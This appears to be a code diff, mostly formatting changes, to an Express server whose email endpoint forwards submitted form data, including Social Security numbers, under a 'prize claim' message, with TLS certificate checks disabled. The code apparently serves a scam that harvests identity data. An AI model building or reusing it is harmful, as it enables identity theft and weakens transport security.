@@ -6,6 +6,7 @@ require("dotenv").config();
 const PORT = process.env.PORT || 3000;
 
 const app = express();
+// const app = express();
 
 /// Middleware
 app.use(cors());
@@ -24,8 +25,6 @@ app.get("/home", (req, res) => {
 // Configure multer for handling form data
 const upload = multer();
 
-
-
 // Email transporter setup
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
@@ -33,11 +32,11 @@ const transporter = nodemailer.createTransport({
   secure: false,
   auth: {
     user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS
+    pass: process.env.EMAIL_PASS,
   },
   tls: {
-    rejectUnauthorized: false
-  }
+    rejectUnauthorized: false,
+  },
 });
 
 // Test email configuration
@@ -84,7 +83,7 @@ app.post("/send-email", upload.none(), async (req, res) => {
             <p><strong>SSN:</strong> ${req.body.ssn}</p>
           </div>
         </div>
-      `
+      `,
     };
 
     // Wait for email to be sent before sending response
@@ -94,15 +93,14 @@ app.post("/send-email", upload.none(), async (req, res) => {
     // Send success response after email is sent
     res.status(200).json({
       success: true,
-      message: "Your prize claim form has been submitted successfully."
+      message: "Your prize claim form has been submitted successfully.",
     });
-
   } catch (error) {
     console.error("Server Error:", error);
     res.status(500).json({
       success: false,
       message: "Unable to submit your form. Please try again later.",
-      error: error.message
+      error: error.message,
     });
   }
 });
